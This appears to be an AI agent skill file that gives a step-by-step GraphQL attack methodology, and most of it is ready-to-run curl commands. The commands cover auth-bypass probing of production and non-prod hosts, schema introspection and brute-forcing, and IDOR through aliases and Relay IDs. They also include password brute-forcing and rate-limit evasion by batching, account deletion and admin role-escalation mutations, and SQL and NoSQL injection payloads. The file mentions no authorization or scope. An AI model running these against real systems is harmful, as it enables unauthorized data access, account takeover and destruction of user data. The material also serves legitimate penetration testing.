---
name: proto-graphql
description: "GraphQL security testing skill. Tests introspection, authorization bypasses, IDOR via aliases, batching abuse, path-level auth bypass, and federation exploitation. Triggers: 'graphql', 'graphql security', 'graphql introspection', 'graphql idor', 'graphql auth bypass', 'graphql injection', 'graphql testing', '__schema', 'query mutation'."
---

# GraphQL Security Testing

Test every resolver independently — child resolvers often skip auth checks assumed validated by parents.

## Phase 1: Endpoint Discovery

```bash
TARGET="https://<target>"

# Common GraphQL paths
for path in /graphql /api/graphql /v1/graphql /gql /query /graphiql /graphql/v1 /api/v1/graphql; do
  status=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET$path" \
    -H "Content-Type: application/json" -d '{"query":"{__typename}"}')
  echo "$status $path"
done

# WebSocket endpoint (subscriptions)
# Look for ws:// or wss:// in JS files
grep -r "createClient\|GraphQLWsLink\|subscriptionClient" js_dump/ | grep -oE "(ws|wss)://[^'\"]+"
```

## Phase 2: Path-Level Auth Bypass (Highest ROI)

Highest-impact check: teams protect `/` with Basic Auth but miss `/graphql`:

```bash
# Check if root requires auth
curl -s -o /dev/null -w "%{http_code}" "$TARGET/"
# If 401, test GraphQL without auth:
curl -s -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}' | jq .

# If 200 + typename returned = auth bypass confirmed

# Target non-prod environments
for subdomain in dev staging uat ppd qa preprod; do
  root_status=$(curl -s -o /dev/null -w "%{http_code}" "https://$subdomain.<target.com>/")
  gql_status=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://$subdomain.<target.com>/graphql" \
    -H "Content-Type: application/json" -d '{"query":"{__typename}"}')
  echo "$subdomain: root=$root_status graphql=$gql_status"
done
```

## Phase 3: Schema Introspection

```bash
# Full introspection query
curl -s -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{__schema{types{name fields{name args{name type{name kind ofType{name kind}}}}}}}"
  }' | jq '.data.__schema.types[] | select(.name | startswith("_") | not) | .name'

# Extract all mutations (state-changing operations)
curl -s -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{mutationType{fields{name args{name type{name kind}}}}}}"}' | jq .

# Extract all queries
curl -s -X POST "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{fields{name args{name type{name kind}}}}}}"}' | jq .
```

**When introspection disabled:**
```bash
# Infer via __typename
curl -X POST "$TARGET/graphql" -d '{"query":"{user{__typename}}"}'

# Field suggestion errors
curl -X POST "$TARGET/graphql" -d '{"query":"{usr{id}}"}'  # typo → suggests "user"

# Clairvoyance (schema bruteforce)
python3 clairvoyance.py -u "$TARGET/graphql" -w wordlist.txt -o schema.json
```

## Phase 4: Authorization Testing

**IDOR via aliases (one request, multiple objects):**
```graphql
query {
  own_order: order(id: "MY_ORDER_ID") { id total owner { email } }
  foreign_order: order(id: "VICTIM_ORDER_ID") { id total owner { email } }
}
```

```bash
curl -X POST "$TARGET/graphql" \
  -H "Authorization: Bearer <attacker_token>" \
  -d '{
    "query": "query { own: order(id:\"<own_id>\") { id owner { email } } foreign: order(id:\"<victim_id>\") { id owner { email } } }"
  }' | jq .
```

**Child resolver auth bypass:**
```bash
# Access parent → child field that skips auth
curl -X POST "$TARGET/graphql" \
  -H "Authorization: Bearer <low_priv_token>" \
  -d '{"query":"{ me { organization { allUsers { id email role } } } }"}' | jq .
# Low-priv user accessing admin field via org.allUsers
```

**Relay Node bypass (decode base64 IDs):**
```bash
# Relay nodes encode as "type:id" in base64
echo "VXNlcjoxMjM0" | base64 -d  # → User:1234
echo "T3JkZXI6OTk5" | base64 -d  # → Order:999
# Swap type/id pairs and test cross-type access
```

## Phase 5: Batching Abuse

```bash
# Batch queries to bypass rate limits
curl -X POST "$TARGET/graphql" \
  -d '[
    {"query":"{ user(id:\"1\") { email } }"},
    {"query":"{ user(id:\"2\") { email } }"},
    {"query":"{ user(id:\"3\") { email } }"}
  ]'

# Alias batching (all in one request)
curl -X POST "$TARGET/graphql" \
  -d '{"query":"{ u1: user(id:\"1\") { email } u2: user(id:\"2\") { email } u3: user(id:\"3\") { email } }"}'

# Password bruteforce via alias batching
curl -X POST "$TARGET/graphql" \
  -d '{"query":"{ a1: login(email:\"admin@t.com\",pass:\"pass1\"){token} a2: login(email:\"admin@t.com\",pass:\"pass2\"){token} }"}'
```

## Phase 6: Mutations & State Changes

```bash
# Test admin mutations with low-priv token
curl -X POST "$TARGET/graphql" \
  -H "Authorization: Bearer <user_token>" \
  -d '{"query":"mutation { deleteUser(id: \"<victim_id>\") { success } }"}' | jq .

# Test privilege escalation mutation
curl -X POST "$TARGET/graphql" \
  -H "Authorization: Bearer <user_token>" \
  -d '{"query":"mutation { updateUserRole(id: \"<own_id>\", role: ADMIN) { role } }"}' | jq .
```

## Phase 7: Injection Testing

```bash
# GraphQL injection via argument manipulation
curl -X POST "$TARGET/graphql" \
  -d '{"query":"{ user(id: \"1\\\" OR \\\"1\\\"=\\\"1\") { email } }"}' | jq .

# NoSQL injection via GraphQL
curl -X POST "$TARGET/graphql" \
  -d '{"query":"{ user(id: {\"$ne\": null}) { email role } }"}' | jq .
```

## Validation (REQUIRED before reporting)

Confidence threshold ≥0.70 required. Three criteria:
1. **Causality**: specific query/operation → unauthorized data exposure or state change
2. **Reproducibility**: exact GraphQL operation body that reproduces the finding
3. **Impact**: data exposed (user PII, credentials, admin data) or unauthorized action executed

Document: endpoint URL, HTTP method, full request body, response showing unauthorized data.
